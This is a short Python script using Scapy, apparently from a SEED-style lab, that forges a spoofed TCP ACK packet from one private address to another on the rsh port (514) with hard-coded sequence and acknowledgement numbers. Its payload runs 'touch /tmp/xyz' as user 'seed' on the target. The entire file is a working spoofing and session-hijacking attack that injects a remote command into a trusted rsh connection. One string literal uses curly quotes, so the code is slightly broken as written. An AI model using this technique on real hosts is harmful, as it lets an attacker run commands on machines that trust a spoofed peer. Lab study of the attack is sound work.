from scapy.all import *


ip=IP(src="10.0.2.12", dst="10.0.2.11")
tcp=TCP(sport=1023, dport=514, flags="A", seq=778933537, ack=2241571421)
if tcp.flags=="A":
	print("establishing ack packet")

data = ’9090\x00seed\x00seed\x00touch /tmp/xyz\x00’
pkt=ip/tcp/data
ls(pkt)
send(pkt,verbose=0)